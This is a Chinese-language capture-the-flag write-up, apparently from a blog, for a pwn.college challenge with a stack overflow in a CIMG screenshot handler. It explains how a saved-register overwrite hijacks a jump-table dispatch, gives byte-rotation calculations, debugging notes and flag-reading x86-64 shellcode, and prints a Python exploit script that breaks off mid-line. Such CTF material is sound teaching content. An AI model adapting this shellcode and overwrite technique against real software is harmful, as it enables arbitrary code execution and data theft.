+<p>当截屏宽度 <code>w &gt;= 137</code> 时，写入超出缓冲区边界，覆盖
+saved rbx。</p>
+<p><strong>覆盖 saved rbx 的效果</strong>：下一个指令通过
+<code>notrack jmp rax</code> 分发时，<code>rbx</code> 已被我们控制。由于
+<code>rax = [rbx + rcx*4] + rbx</code>，我们可以让分发跳转到任意地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">notrack jmp rax        ; rax = [rbx + rcx*4] + rbx</span><br><span class="line">rbx：作为跳转表的基地址。</span><br><span class="line">rcx：作为索引（乘以 4，表明是一个 32 位跳转偏移量表）。</span><br><span class="line">rax：先从 [rbx + rcx*4] 读取一个 32 位有符号偏移，再把这个偏移加到基址 rbx 上，得到最终的跳转目标，然后 jmp rax。</span><br><span class="line">这实际上是在实现一个 基于相对偏移的跳转表分发：表项存放的是“目标地址 - 表基址”的有符号差值。</span><br></pre></td></tr></table></figure>
+<h2 id="数据流与旋转">4. 数据流与旋转</h2>
+<p>在构造 payload 之前，需要理解数据经过的变换：</p>
+<p><strong>handle_5（加载文件）</strong>：从文件读取原始字节到 sprite
+数据区。</p>
+<p><strong>handle_4（渲染）</strong>：将 sprite
+数据写入帧缓冲区。实测发现存在 2 字节旋转：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">framebuffer[N] = sprite_data[(N + 253) % 255]</span><br></pre></td></tr></table></figure>
+<p><strong>handle_1337（截屏）</strong>：线性读取帧缓冲区到栈缓冲区：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot[N] = framebuffer[N]</span><br></pre></td></tr></table></figure>
+<p>因此截屏数据相对于原始文件数据旋转了 2 字节：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screenshot[N] = file[(N + 253) % 255] = file[N - 2]  (N ≥ 2)</span><br></pre></td></tr></table></figure>
+<p>这意味着：在 file 中某个偏移 <code>K</code>
+的数据，在截屏中出现在偏移 <code>(K + 2) % 255</code>。</p>
+<h3 id="验证旋转">验证旋转</h3>
+<p>制作一个「每个字节值 = 自身索引」的测试 sprite，渲染并显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">display[0] = 253, delta = 253</span><br><span class="line">display[1] = 254, delta = 253</span><br><span class="line">display[2] = 0,   delta = 253  → 来自 file[0]</span><br><span class="line">display[3] = 1,   delta = 253</span><br><span class="line">...</span><br><span class="line">display[11] = 9,  delta = 253</span><br><span class="line">display[12] = 11, delta = 254  → file[10] 被跳过了！</span><br></pre></td></tr></table></figure>
+<p>实际上存在更复杂的 skip 行为，但对于 exploit
+中使用的偏移范围（18-142），2 字节旋转模型足够精确。</p>
+<h2 id="payload-布局">5. Payload 布局</h2>
+<p><strong>利用指令 7（sleep）触发跳转</strong>：指令 7 对应跳转表索引
+<code>7 - 2 = 5</code>，读取 <code>[rbx + 5*4] = [rbx + 20]</code>。</p>
+<p>在 file 中的布局：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file[0:18]:   NOP sled (0x90)</span><br><span class="line">file[18:22]:  int32 jump_offset = 24     ——→ 经过旋转 → screenshot[20:24] = 跳转偏移</span><br><span class="line">file[22:??]:   shellcode                  ——→ 经过旋转 → screenshot[24:??]  = shellcode</span><br><span class="line">file[134:142]: QWORD buf_addr            ——→ 经过旋转 → 覆盖 saved rbx</span><br></pre></td></tr></table></figure>
+<p><strong>旋转补偿计算</strong>：</p>
+<ul>
+<li>指令 7 读取 <code>screenshot[20:24]</code> → 需要
+<code>file[(20+253)%255 : (23+253)%255]</code> =
+<code>file[18:22]</code></li>
+<li>Shellcode 位于 <code>screenshot[24]</code> → 需要
+<code>file[(24+253)%255]</code> = <code>file[22]</code></li>
+<li>Saved rbx 覆盖位于 <code>screenshot[134:142]</code> → 需要
+<code>file[(134+253)%255 : (141+253)%255]</code> =
+<code>file[132:140]</code></li>
+</ul>
+<p>实际上 saved rbx 的精确位置是 file[134]，比纯静态分析（136）少 2
+字节。这是栈对齐和渲染 skip 共同作用的结果，通过 SIGSEGV
+测试实证确认。</p>
+<h2 id="shellcode">6. Shellcode</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_cat_shellcode</span>(<span class="params">path=<span class="string">b&quot;/flag&quot;</span></span>):</span><br><span class="line">    sc = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Push path to stack</span></span><br><span class="line">    p = path + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(p) % <span class="number">8</span>: p += <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p) - <span class="number">8</span>, -<span class="number">8</span>, -<span class="number">8</span>):</span><br><span class="line">        qw = struct.unpack(<span class="string">&quot;&lt;Q&quot;</span>, p[i:i+<span class="number">8</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> qw == <span class="number">0</span>:</span><br><span class="line">            sc += <span class="string">b&quot;\x48\x31\xc0\x50&quot;</span>      <span class="comment"># xor rax,rax; push rax</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sc += <span class="string">b&quot;\x48\xb8&quot;</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, qw) + <span class="string">b&quot;\x50&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># open(path, O_RDONLY)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xe7&quot;</span>                 <span class="comment"># mov rdi, rsp</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x31\xf6&quot;</span>                 <span class="comment"># xor rsi, rsi</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x31\xd2&quot;</span>                 <span class="comment"># xor rdx, rdx</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xc0\xb0\x02\x0f\x05&quot;</span>     <span class="comment"># xor eax; mov al,2; syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(fd, stack_buf, 0x400)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xc7&quot;</span>                 <span class="comment"># mov rdi, rax</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x81\xec\x00\x04\x00\x00&quot;</span> <span class="comment"># sub rsp, 0x400</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xe6&quot;</span>                 <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    sc += <span class="string">b&quot;\xba\x00\x04\x00\x00&quot;</span>         <span class="comment"># mov edx, 0x400</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xc0\x0f\x05&quot;</span>             <span class="comment"># xor eax; syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># write(1, stack_buf, n)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xc2&quot;</span>                 <span class="comment"># mov rdx, rax</span></span><br><span class="line">    sc += <span class="string">b&quot;\xbf\x01\x00\x00\x00&quot;</span>         <span class="comment"># mov edi, 1</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xe6&quot;</span>                 <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    sc += <span class="string">b&quot;\xb8\x01\x00\x00\x00\x0f\x05&quot;</span> <span class="comment"># mov eax,1; syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># exit(0)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sc</span><br></pre></td></tr></table></figure>
+<h2 id="调试历程">7. 调试历程</h2>
+<h3 id="栈偏移校准">7.1 栈偏移校准</h3>
+<p>通过读取 <code>/proc/self/stat</code> 泄露
+<code>startstack</code>，然后在本地和远程分别校准栈偏移：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handle_1337 buffer = startstack - 0x11d0</span><br><span class="line">STACK_OFFSET = -0x11d0</span><br></pre></td></tr></table></figure>
+<p><strong>关键</strong>：用于泄露和用于 exploit 的 <code>.cimg</code>
+文件名必须相同（<code>/tmp/exploit.cimg</code>），因为不同的文件名长度会影响
+<code>argv</code> 在栈上的布局。</p>
+<h3 id="旋转验证">7.2 旋转验证</h3>
+<p>填充 0xCC（INT3），在不同宽度下触发溢出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">w=140: SIGSEGV  ← 4 字节溢出已触及 saved rbx 低位</span><br><span class="line">w=142: SIGSEGV</span><br><span class="line">w=144: SIGSEGV</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>所有宽度都崩溃，确认 saved rbx 被成功覆盖。需要填入正确的
+<code>buf_addr</code>。</p>
+<h3 id="shellcode-调试exit42-测试">7.3 Shellcode
+调试：<code>exit(42)</code> 测试</h3>
+<p>使用最小 shellcode 验证代码执行：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc = <span class="string">b&quot;\xbf\x2a\x00\x00\x00&quot;</span> + <span class="string">b&quot;\xb8\x3c\x00\x00\x00\x0f\x05&quot;</span>  <span class="comment"># exit(42)</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack=-0x11d0 rbx_off=134 sc=exit42: 42 &lt;&lt;&lt; EXIT42! SHELLCODE EXECUTED!</span><br></pre></td></tr></table></figure>
+<p><strong>确认 shellcode 执行成功！</strong></p>
+<h3 id="shellcode-调试rax-污染">7.4 Shellcode 调试：rax 污染</h3>
+<p>接下来测试写 "WORKS" 到 stdout——成功了。但打开 <code>/flag</code>
+就失败。问题定位：</p>
+<p><code>mov al, 2</code> 只设置 AL 的低字节，RAX
+的高位保留着上一个操作的垃圾值（<code>0x7fffffffda18</code>，即跳转目标地址）。所以
+syscall 发出的系统调用号是 <code>0x7fffffffda02</code> 而不是
+<code>2</code>，内核返回 <code>-ENOSYS</code>。</p>
+<p><strong>修复</strong>：在所有 syscall 前添加
+<code>xor eax, eax</code>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误：</span></span><br><span class="line"><span class="string">b&quot;\xb0\x02\x0f\x05&quot;</span>        <span class="comment"># mov al,2; syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确：</span></span><br><span class="line"><span class="string">b&quot;\x31\xc0\xb0\x02\x0f\x05&quot;</span>  <span class="comment"># xor eax,eax; mov al,2; syscall</span></span><br></pre></td></tr></table></figure>
+<p>修复后 flags 到手。</p>
+<h2 id="完整-exploit">8. 完整 Exploit</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ssh hacker@dojo.pwn.college <span class="string">&#x27;python3 /tmp/exploit_final.py&#x27;</span></span><br><span class="line">[+] startstack = 0x7fffffffebd0</span><br><span class="line">[+] buffer      = 0x7fffffffda00</span><br><span class="line">[+] shellcode   = 66 bytes</span><br><span class="line">[+] sc.bin      = /tmp/sc.bin (255 bytes)</span><br><span class="line">[+] exploit     = /tmp/exploit.cimg</span><br><span class="line"></span><br><span class="line">[*] Running exploit...</span><br><span class="line"></span><br><span class="line">=======================================================</span><br><span class="line">[+] FLAG: pwn.college&#123;**********************************************&#125;</span><br><span class="line">=======================================================</span><br></pre></td></tr></table></figure>
+<p>完整 exploit 脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">PwnCollege - CIMG Screenshots Exploit (FINAL)</span></span><br><span class="line"><span class="string">==============================================</span></span><br><span class="line"><span class="string">Challenge: integration-cimg-screenshot-sc</span></span><br><span class="line"><span class="string">Vulnerability: Stack buffer overflow in handle_1337 (screenshot handler)</span></span><br><span class="line"><span class="string">Technique: Overwrite saved rbx → hijack notrack jmp dispatch → shellcode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Key findings:</span></span><br><span class="line"><span class="string">  - Rotation: screenshot[N] = file[(N+253)%255] = file[N-2] for N&gt;=2</span></span><br><span class="line"><span class="string">  - Saved rbx at file offset 134 (empirical, due to rotation)</span></span><br><span class="line"><span class="string">  - Directive 7 reads *(rbx+20), so jump offset at file[18] → screenshot[20]</span></span><br><span class="line"><span class="string">  - Shellcode at file[22] → screenshot[24], jump_target = 24</span></span><br><span class="line"><span class="string">  - Stack offset: buffer = startstack - 0x11d0</span></span><br><span class="line"><span class="string">  - MUST zero eax before mov al, N for syscalls (upper bits of rax have garbage)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> struct, subprocess, re, os, sys</span><br><span class="line"></span><br><span class="line">FNAME = <span class="string">&quot;/tmp/exploit.cimg&quot;</span></span><br><span class="line">SC_FILE = <span class="string">&quot;/tmp/sc.bin&quot;</span></span><br><span class="line">BIN = <span class="string">&quot;/challenge/integration-cimg-screenshot-sc&quot;</span></span><br><span class="line">STACK_OFFSET = -<span class="number">0x11d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(BIN):</span><br><span class="line">    BIN = <span class="string">&quot;./integration-cimg-screenshot-sc.patched&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hdr</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;4sHBBi&quot;</span>, <span class="string">b&quot;cIMG&quot;</span>, <span class="number">4</span>, <span class="number">255</span>, <span class="number">1</span>, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">d_load</span>(<span class="params">sid, path</span>):</span><br><span class="line">    d = struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">5</span>) + struct.pack(<span class="string">&quot;BBB&quot;</span>, sid, <span class="number">255</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> d + path.encode().ljust(<span class="number">255</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">d_render</span>(<span class="params">sid</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">4</span>) + struct.pack(</span><br><span class="line">        <span class="string">&quot;BBBBBBBBB&quot;</span>, sid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">1</span>, <span class="number">0xAA</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">d_screenshot</span>(<span class="params">sid, w=<span class="number">144</span></span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">1337</span>) + struct.pack(<span class="string">&quot;BBBBB&quot;</span>, sid, <span class="number">0</span>, <span class="number">0</span>, w, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">d_show</span>():</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">6</span>) + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ─── Shellcode ────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_cat_shellcode</span>(<span class="params">path=<span class="string">b&quot;/flag&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;open(path); read(fd, stack, 0x400); write(1, stack, n); exit(0)&quot;&quot;&quot;</span></span><br><span class="line">    sc = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Push path to stack (null-terminated, 8-byte aligned)</span></span><br><span class="line">    p = path + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(p) % <span class="number">8</span>:</span><br><span class="line">        p += <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p) - <span class="number">8</span>, -<span class="number">8</span>, -<span class="number">8</span>):</span><br><span class="line">        chunk = p[i:i + <span class="number">8</span>]</span><br><span class="line">        qw = struct.unpack(<span class="string">&quot;&lt;Q&quot;</span>, chunk)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> qw == <span class="number">0</span>:</span><br><span class="line">            sc += <span class="string">b&quot;\x48\x31\xc0\x50&quot;</span>  <span class="comment"># xor rax,rax; push rax</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sc += <span class="string">b&quot;\x48\xb8&quot;</span> + struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, qw) + <span class="string">b&quot;\x50&quot;</span>  <span class="comment"># mov rax,imm; push</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># open(path, O_RDONLY, 0)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xe7&quot;</span>  <span class="comment"># mov rdi, rsp</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x31\xf6&quot;</span>  <span class="comment"># xor rsi, rsi</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x31\xd2&quot;</span>  <span class="comment"># xor rdx, rdx</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xc0\xb0\x02\x0f\x05&quot;</span>  <span class="comment"># xor eax,eax; mov al,2; syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># read(fd, stack_buf, 0x400)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xc7&quot;</span>  <span class="comment"># mov rdi, rax</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x81\xec\x00\x04\x00\x00&quot;</span>  <span class="comment"># sub rsp, 0x400</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xe6&quot;</span>  <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    sc += <span class="string">b&quot;\xba\x00\x04\x00\x00&quot;</span>  <span class="comment"># mov edx, 0x400</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xc0\x0f\x05&quot;</span>  <span class="comment"># xor eax,eax; syscall (read)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># write(1, stack_buf, n)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xc2&quot;</span>  <span class="comment"># mov rdx, rax</span></span><br><span class="line">    sc += <span class="string">b&quot;\xbf\x01\x00\x00\x00&quot;</span>  <span class="comment"># mov edi, 1</span></span><br><span class="line">    sc += <span class="string">b&quot;\x48\x89\xe6&quot;</span>  <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    sc += <span class="string">b&quot;\xb8\x01\x00\x00\x00\x0f\x05&quot;</span>  <span class="comment"># mov eax,1; syscall</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># exit(0)</span></span><br><span class="line">    sc += <span class="string">b&quot;\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05&quot;</span></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ─── Exploit ──────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_startstack</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Leak startstack via /proc/self/stat (ASLR disabled by binary).&quot;&quot;&quot;</span></span><br><span class="line">    payload = hdr(<span class="number">3</span>) + d_load(<span class="number">0</span>, <span class="string">&quot;/proc/self/stat&quot;</span>) + d_render(<span class="number">0</span>) + d_show()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(FNAME, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line">    proc = subprocess.run([BIN, FNAME], capture_output=<span class="literal">True</span>, timeout=<span class="number">15</span>)</span><br><span class="line">    chars = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">rb&#x27;m(.)\x1b\[0m&#x27;</span>, proc.stdout):</span><br><span class="line">        chars.append(m.group(<span class="number">1</span>))</span><br><span class="line">    text = <span class="string">b&quot;&quot;</span>.join(chars).decode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line">    fields = text.split()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(fields) &lt; <span class="number">28</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Failed to parse startstack&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    ss = <span class="built_in">int</span>(fields[<span class="number">27</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] startstack = <span class="subst">&#123;<span class="built_in">hex</span>(ss)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">startstack</span>):</span><br><span class="line">    buf_addr = startstack + STACK_OFFSET</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] buffer      = <span class="subst">&#123;<span class="built_in">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    sc = make_cat_shellcode(<span class="string">b&quot;/flag&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] shellcode   = <span class="subst">&#123;<span class="built_in">len</span>(sc)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build file payload (255 bytes)</span></span><br><span class="line">    <span class="comment"># Rotation: screenshot[N] = file[N-2] (mod 255)</span></span><br><span class="line">    <span class="comment"># Directive 7 reads *(rbx+20) = screenshot[20..23] = file[18..21]</span></span><br><span class="line">    <span class="comment"># Shellcode at file[22] → screenshot[24]</span></span><br><span class="line">    <span class="comment"># Saved rbx at file[134]</span></span><br><span class="line">    payload = <span class="built_in">bytearray</span>(<span class="number">255</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">        payload[i] = <span class="number">0x90</span>  <span class="comment"># NOP sled</span></span><br><span class="line"></span><br><span class="line">    jump_off = <span class="number">24</span></span><br><span class="line">    struct.pack_into(<span class="string">&quot;&lt;i&quot;</span>, payload, <span class="number">18</span>, jump_off)</span><br><span class="line"></span><br><span class="line">    sc_start = <span class="number">22</span></span><br><span class="line">    <span class="keyword">if</span> sc_start + <span class="built_in">len</span>(sc) &gt; <span class="number">134</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Shellcode too long: <span class="subst">&#123;<span class="built_in">len</span>(sc)&#125;</span> &gt; <span class="subst">&#123;<span class="number">134</span> - sc_start&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    payload[sc_start:sc_start + <span class="built_in">len</span>(sc)] = sc</span><br><span class="line"></span><br><span class="line">    struct.pack_into(<span 